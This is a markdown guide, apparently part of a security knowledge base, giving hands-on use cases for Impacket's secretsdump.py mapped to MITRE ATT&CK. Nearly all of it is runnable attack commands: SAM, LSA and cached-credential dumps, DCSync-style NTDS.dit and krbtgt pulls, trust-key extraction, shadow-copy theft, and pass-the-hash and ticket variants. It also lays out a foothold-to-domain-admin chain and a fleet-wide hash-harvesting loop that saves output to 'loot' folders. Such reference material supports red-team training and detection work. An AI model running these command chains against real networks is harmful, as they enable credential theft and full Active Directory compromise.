# Impacket — secretsdump.py — Hands-On Use Cases

Every command below maps to one of the three extraction paths documented in `01 - Overview.md`'s How It Works — Remote Registry (SAM/LSA/cache), DRSUAPI (NTDS.dit, the DCSync-equivalent path), or Offline/Local. Note **which path** each use case takes before reading its evidence: `03`/`04` are organized the same way and expect that context.

## Contents
- [Remote SAM Dump](#remote-sam-dump)
- [Remote LSA Secrets](#remote-lsa-secrets)
- [Remote Cached Domain Credentials](#remote-cached-domain-credentials)
- [Combined SAM + LSA + Cache in One Run](#combined-sam--lsa--cache-in-one-run)
- [Full DCSync-Style NTDS.dit Pull (DRSUAPI)](#full-dcsync-style-ntdsdit-pull-drsuapi)
- [NTLM-Only Fast Full-Domain Pull](#ntlm-only-fast-full-domain-pull)
- [Single-User Targeted DRSUAPI Pull](#single-user-targeted-drsuapi-pull)
- [LDAP-Filtered Targeted Pull](#ldap-filtered-targeted-pull)
- [Password History and Account Status](#password-history-and-account-status)
- [Trust-Key Extraction](#trust-key-extraction)
- [Legacy VSS-Based NTDS Pull](#legacy-vss-based-ntds-pull)
- [WMI-Based Remote Shadow-Snapshot Pull](#wmi-based-remote-shadow-snapshot-pull)
- [Kerb-Key-List Pull Against an RODC](#kerb-key-list-pull-against-an-rodc)
- [Offline Hive and NTDS.dit Parsing](#offline-hive-and-ntdsdit-parsing)
- [Resuming an Interrupted Large NTDS Dump](#resuming-an-interrupted-large-ntds-dump)
- [Pass-the-Hash and Kerberos Authentication Variants](#pass-the-hash-and-kerberos-authentication-variants)
- [Chained Use After an Initial Foothold](#chained-use-after-an-initial-foothold)
- [Fleet-Wide Local-Admin Hash Harvesting](#fleet-wide-local-admin-hash-harvesting)

---

## Remote SAM Dump

**MITRE ATT&CK:** [T1003.002](https://attack.mitre.org/techniques/T1003/002/) (OS Credential Dumping: Security Account Manager)

```bash
secretsdump.py -skip-security CORP/jsmith:Summer2026!@10.10.10.20
```
Pulls only the local SAM database — every local account's LM/NTLM hash — via Remote Registry (Path 1). `-skip-security` suppresses the LSA-secrets leg of the default combined run so only SAM output appears. Output lines look like `Administrator:500:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::`.

## Remote LSA Secrets

**MITRE ATT&CK:** [T1003.004](https://attack.mitre.org/techniques/T1003/004/) (OS Credential Dumping: LSA Secrets)

```bash
secretsdump.py -skip-sam CORP/jsmith:Summer2026!@10.10.10.20
```
Pulls only LSA Secrets — stored service-account passwords, scheduled-task credentials, and other plaintext-equivalent secrets under `HKLM\SECURITY\Policy\Secrets` — via the same Remote Registry path. High-value when a service account with a static password is configured on the box, since the recovered secret is often reused elsewhere in the environment.

## Remote Cached Domain Credentials

**MITRE ATT&CK:** [T1003.005](https://attack.mitre.org/techniques/T1003/005/) (OS Credential Dumping: Cached Domain Credentials)

```bash
secretsdump.py CORP/jsmith:Summer2026!@10.10.10.20
```
A plain run against a domain-joined host (no `-skip-*` flags, no `-just-dc*`) dumps SAM + LSA Secrets + cached domain logons together. The cached-credential lines are what's distinctive here — format `domain/username:$DCC2$<iterationcount>#username#<hash>` (MSCache2/DCC2), directly loadable into hashcat mode 2100. This is the **only** offline-crackable domain-credential artifact obtainable **without** DA-equivalent replication rights — it only reveals what's cached locally from prior interactive logons on that specific box, not the live domain hash.

## Combined SAM + LSA + Cache in One Run

```bash
secretsdump.py -outputfile loot/host20 CORP/jsmith:Summer2026!@10.10.10.20
```
The default, no-flag behavior against a non-DC target — all three Path-1 legs in a single invocation, written to `loot/host20.sam`, `loot/host20.secrets`, and `loot/host20.cached`. This is the shape most engagements actually use: one pass per compromised host, not three separate invocations.

## Full DCSync-Style NTDS.dit Pull (DRSUAPI)

**MITRE ATT&CK:** [T1003.006](https://attack.mitre.org/techniques/T1003/006/) (OS Credential Dumping: DCSync)

```bash
secretsdump.py -just-dc -outputfile loot/domain_full CORP/svc-backup:'P@ssw0rd!'@dc01.corp.local
```
The full-domain payoff — every account's NTLM hash and Kerberos keys, replicated over MS-DRSR exactly like Mimikatz's `lsadump::dcsync /all`. Requires the authenticating principal hold `DS-Replication-Get-Changes-All` on the domain naming context — **not** local admin on the DC. See `Mimikatz/lsadump (DCSync)/02 - Hands-On Use Cases.md` for the equivalent Mimikatz command and the prerequisite/rights framing, which applies identically here since it's the same underlying protocol call. Produces `.ntds`, `.ntds.kerberos`, and `.ntds.cleartext` output files.

## NTLM-Only Fast Full-Domain Pull

**MITRE ATT&CK:** T1003.006

```bash
secretsdump.py -just-dc-ntlm CORP/svc-backup:'P@ssw0rd!'@dc01.corp.local
```
Skips requesting/decoding the Kerberos-key-bearing `supplementalCredentials` attribute entirely — noticeably faster against a large domain (tens of thousands of accounts) when only NTLM hashes are needed, e.g. for a mass password-reuse/spray-validation pass rather than Kerberos-ticket forging.

## Single-User Targeted DRSUAPI Pull

**MITRE ATT&CK:** T1003.006

```bash
secretsdump.py -just-dc-user krbtgt CORP/svc-backup:'P@ssw0rd!'@dc01.corp.local
```
Replicates a single object — the canonical Golden Ticket feeder, same operational purpose as Mimikatz's `lsadump::dcsync /user:krbtgt`. `-just-dc-user` implies `-just-dc` automatically. A single-object pull is a materially smaller, faster, and quieter operation than a full-domain run (see the volumetric-signal note in `04 - Target Evidence.md` and `Mimikatz/lsadump (DCSync)/04 - Target Evidence.md`'s equivalent).

## LDAP-Filtered Targeted Pull

**MITRE ATT&CK:** T1003.006

```bash
secretsdump.py -ldapfilter '(memberOf=CN=Domain Admins,CN=Users,DC=corp,DC=local)' \
  CORP/svc-backup:'P@ssw0rd!'@dc01.corp.local
```
Pulls credential material only for accounts matching an LDAP filter — here, every current member of Domain Admins — rather than one named user or the entire domain. Implies `-just-dc`. Useful when a prior enumeration pass (BloodHound, `ldapsearch`) has already identified a specific target set and a full-domain pull would be unnecessarily loud.

## Password History and Account Status

**MITRE ATT&CK:** T1003.002 / T1003.006 depending on which leg is in scope for the run

```bash
secretsdump.py -just-dc -history -user-status -pwd-last-set \
  CORP/svc-backup:'P@ssw0rd!'@dc01.corp.local
```
`-history` recovers prior password hashes (helps identify password-reuse-across-rotation patterns and confirm whether a leaked historical hash is still cracked-and-valid material). `-user-status` and `-pwd-last-set` annotate console output with account-disabled state and last-password-change time — useful for triaging which recovered accounts are actually live versus stale/disabled.

## Trust-Key Extraction

**MITRE ATT&CK:** T1003.006 (same replication-based credential-access class; MITRE has no separate cataloged sub-technique specifically for inter-domain trust-key dumping — flagging this rather than forcing a fit)

```bash
# Trust keys alongside the regular account pull
secretsdump.py -just-dc -trust-keys CORP/svc-backup:'P@ssw0rd!'@dc01.corp.local

# Trust keys ONLY, skipping every regular account secret
secretsdump.py -just-trust-keys CORP/svc-backup:'P@ssw0rd!'@dc01.corp.local
```
Recovers trusted-domain-object (TDO) secrets and derives the inter-realm Kerberos AES/RC4 keys for each configured trust direction — the DRSUAPI-path equivalent of Mimikatz's `lsadump::trust`, feeding directly into cross-domain/cross-forest ticket-forging attacks once a foothold in one domain of a multi-domain forest is established.

## Legacy VSS-Based NTDS Pull

**MITRE ATT&CK:** [T1003.003](https://attack.mitre.org/techniques/T1003/003/) (OS Credential Dumping: NTDS) — MITRE's own T1003.003 page names `secretsdump.py` explicitly as an example tool for this Volume-Shadow-Copy-based acquisition method, distinct from the DRSUAPI/DCSync sub-technique above

```bash
secretsdump.py -use-vss -exec-method smbexec CORP/administrator:'P@ssw0rd!'@dc01.corp.local
```
The pre-DCSync method: remotely runs `vssadmin` (via the `smbexec`-style exec technique here) to snapshot the volume holding `ntds.dit`, copies the file out of the shadow copy, and parses it. Requires **local admin / code-exec rights on the DC itself** — a materially higher bar than DRSUAPI mode's replication-rights requirement — and is correspondingly noisier (see `04 - Target Evidence.md`). Realistic use case: replication rights are blocked or unavailable, but the operator already has an admin shell on the DC through another path.

## WMI-Based Remote Shadow-Snapshot Pull

**MITRE ATT&CK:** T1003.003

```bash
secretsdump.py -use-remoteSSWMI -use-remoteSSWMI-NTDS \
  -remoteSSWMI-local-path ./loot CORP/administrator:'P@ssw0rd!'@dc01.corp.local
```
Same VSS-based NTDS acquisition goal as above, but creates the shadow snapshot via DCOM/WMI's `Win32_ShadowCopy.Create()` method rather than spawning `vssadmin.exe` as a process — trades one detection surface (a `vssadmin.exe` child process) for another (WMI method-invocation traffic). `-use-remoteSSWMI-NTDS` is required in addition to `-use-remoteSSWMI` to actually pull `ntds.dit` rather than just SAM/SYSTEM/SECURITY.

## Kerb-Key-List Pull Against an RODC

**MITRE ATT&CK:** T1003.006-adjacent (Kerberos-protocol-based key derivation rather than replication or file access; not independently cataloged by MITRE)

```bash
secretsdump.py -just-dc -use-keylist -rodcNo 2 -rodcKey <rodc-krbtgt-aes-key-hex> \
  CORP/svc-backup@rodc01.corp.local
```
A narrow, specialized path: derives account keys via a crafted Kerberos TGS request against a **Read-Only Domain Controller**, using that RODC's own krbtgt account number and AES key rather than a full DRSUAPI replication call. Relevant specifically in RODC-scoped scenarios (e.g. a branch-office RODC compromise) where the RODC's Password Replication Policy, not domain-wide replication rights, governs what's recoverable.

## Offline Hive and NTDS.dit Parsing

```bash
# SAM + SECURITY from copied hive files, no network touch at all
secretsdump.py -sam SAM -security SECURITY -system SYSTEM LOCAL

# Full NTDS.dit + SYSTEM hive, e.g. pulled via ntdsutil ifm or a VSC on the DC
secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL
```
Zero network connections. `SYSTEM` is required in every case — the boot key derived from it decrypts whichever of `-sam`/`-security`/`-ntds` were supplied. This is where forensic acquisition of hive files (via `reg save`, VSS, backup extraction, or a full disk image) meets offline analysis — the evidence trail for **how** those files got exfiltrated lives with whatever tool did that copying, not with `secretsdump.py` itself (see `03`/`04 - ... Evidence.md`).

## Resuming an Interrupted Large NTDS Dump

**MITRE ATT&CK:** T1003.006

```bash
secretsdump.py -just-dc -resumefile domain_dump.resume \
  CORP/svc-backup:'P@ssw0rd!'@dc01.corp.local
# If the connection drops partway through, re-running the identical command
# picks up from the last checkpointed USN watermark in domain_dump.resume
# rather than restarting the full-domain replication from scratch
```
DRSUAPI-only. Matters operationally on domains with tens of thousands of objects, where a full `-just-dc` pull can run long enough that a dropped VPN/RDP session or a network blip would otherwise force a complete restart.

## Pass-the-Hash and Kerberos Authentication Variants

**MITRE ATT&CK:** [T1550.002](https://attack.mitre.org/techniques/T1550/002/) (Pass the Hash) or [T1550.003](https://attack.mitre.org/techniques/T1550/003/) (Pass the Ticket), layered on top of whichever base technique above is in use

```bash
# Pass-the-hash into a Path 1 remote SAM/LSA/cache run
secretsdump.py -hashes aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c \
  CORP/administrator@10.10.10.20

# Kerberos ticket into a -just-dc run — target must be the DC's FQDN, not a bare IP
export KRB5CCNAME=administrator.ccache
secretsdump.py -k -no-pass -just-dc CORP/administrator@dc01.corp.local
```
Same authentication-material flexibility as `psexec.py`/`wmiexec.py` — every extraction path accepts `-hashes`, `-k`/`-no-pass`, `-aesKey`, or `-keytab` interchangeably with a cleartext password.

## Chained Use After an Initial Foothold

**MITRE ATT&CK:** T1003.002/.004/.005 (local leg) or T1003.006 (DRSUAPI leg), plus whichever technique got the initial foothold

```bash
# 1. Land a SYSTEM shell via a sibling Impacket tool
wmiexec.py CORP/jsmith:Summer2026!@10.10.10.20

# 2. From that foothold, dump local secrets on the same host
secretsdump.py CORP/jsmith:Summer2026!@10.10.10.20

# 3. Reuse a recovered local admin hash to pivot, then check for DA-equivalent
#    rights before attempting a DRSUAPI pull against a DC
secretsdump.py -hashes aad3b435b51404eeaad3b435b51404ee:<recovered-hash> \
  Administrator@10.10.10.21
```
The canonical Impacket credential-access chain: `psexec.py`/`wmiexec.py` for the foothold, `secretsdump.py` for the payoff, repeated host-to-host until a set of credentials with domain-replication rights turns up — at which point a single `-just-dc` run against a DC ends the chain. See `Impacket/psexec/02 - Hands-On Use Cases.md`'s "Chained Use After Credential Harvesting" for the same pattern from the other tool's perspective.

## Fleet-Wide Local-Admin Hash Harvesting

**MITRE ATT&CK:** T1003.002, at scale

```bash
for ip in $(cat targets.txt); do
  echo "[*] $ip"
  secretsdump.py -skip-security -outputfile "loot/$ip" \
    -hashes aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c \
    CORP/administrator@"$ip" 2>&1 | tee -a sweep.log
done
```
Common when a single local-admin credential (or a shared/weak local Administrator password) is confirmed valid across many hosts — sweeps SAM hashes fleet-wide to check for password reuse or to build a local-admin-hash inventory before attempting lateral movement at scale. This is the same operational shape as `psexec.py`'s fleet-wide use case, but for credential harvesting rather than execution.
